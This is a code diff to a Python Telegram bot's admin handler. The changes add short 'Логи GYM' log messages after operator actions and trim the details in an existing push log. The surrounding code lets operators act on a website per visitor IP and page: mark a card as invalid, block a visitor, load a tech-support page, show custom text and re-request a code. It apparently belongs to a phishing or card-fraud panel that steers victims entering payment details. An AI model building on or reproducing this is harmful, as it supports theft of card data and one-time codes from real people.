@@ -3017,14 +3017,8 @@ async def admin_action_handler(call: types.CallbackQuery):
                 print(f'[DEBUG] Push response: {resp.status}')
                 
                 if resp.status == 200:
-                    # Надсилаємо повідомлення в чат "Логи GYM"
-                    push_log_message = f"🔔 Push отправлен после нажатия push\n\n"
-                    if event_price and event_currency:
-                        push_log_message += f"💰 Сумма: {event_price} {event_currency}\n"
-                    if page_code:
-                        push_log_message += f"#️⃣ Страница: ?page={page_code}\n"
-                    if ip:
-                        push_log_message += f"🌍 IP: {ip}"
+                    # Надсилаємо повідомлення в групу "Логи GYM"
+                    push_log_message = f"🔔 Push отправлен"
                     
                     try:
                         await bot.send_message(APPLICATION_GROUP_ID, push_log_message)
@@ -3074,6 +3068,15 @@ async def admin_action_handler(call: types.CallbackQuery):
                 print(f'[DEBUG] {action.upper()} response: {resp.status}')
 
                 if resp.status == 200:
+                    # Надсилаємо повідомлення в групу "Логи GYM"
+                    action_log_message = f"🔔 {action.upper()} отправлен"
+                    
+                    try:
+                        await bot.send_message(APPLICATION_GROUP_ID, action_log_message)
+                        print(f'[DEBUG] {action.upper()} log message sent to Логи GYM')
+                    except Exception as e:
+                        print(f'[ERROR] Failed to send {action.upper()} log to Логи GYM: {e}')
+                    
                     if action == 'card':
                         await call.answer("✅ Сигнал про невірну карту надіслано на сайт")
                     elif action == 'block':
@@ -3124,6 +3127,15 @@ async def admin_action_handler(call: types.CallbackQuery):
                             await bot.send_message(admin_user_id, support_message)
                             print(f'[DEBUG] Support message sent to admin {admin_user_id}')
                         
+                    # Надсилаємо повідомлення в групу "Логи GYM"
+                    support_log_message = f"🔔 Тех поддержка отправлена"
+                    
+                    try:
+                        await bot.send_message(APPLICATION_GROUP_ID, support_log_message)
+                        print(f'[DEBUG] Support log message sent to Логи GYM')
+                    except Exception as e:
+                        print(f'[ERROR] Failed to send support log to Логи GYM: {e}')
+                    
                         await call.answer("✅ Сторінка техпідтримки завантажена на сайті")
                     else:
                         await call.answer("❌ Помилка завантаження сторінки техпідтримки")
@@ -3142,6 +3154,15 @@ async def admin_action_handler(call: types.CallbackQuery):
             
         await call.answer("✍️ Введіть текст повідомлення для показу на сайті:")
         user_step[call.from_user.id] = f'text_for_{ip}:{page_code}' if page_code else f'text_for_{ip}'
+        # Надсилаємо повідомлення в групу "Логи GYM"
+        text_log_message = f"🔔 Текст отправлен"
+        
+        try:
+            await bot.send_message(APPLICATION_GROUP_ID, text_log_message)
+            print(f'[DEBUG] Text log message sent to Логи GYM')
+        except Exception as e:
+            print(f'[ERROR] Failed to send text log to Логи GYM: {e}')
+        
         print(f'[DEBUG] Text action completed, user_step set to: {user_step[call.from_user.id]}')
         return
     elif action == 'code_request_again':
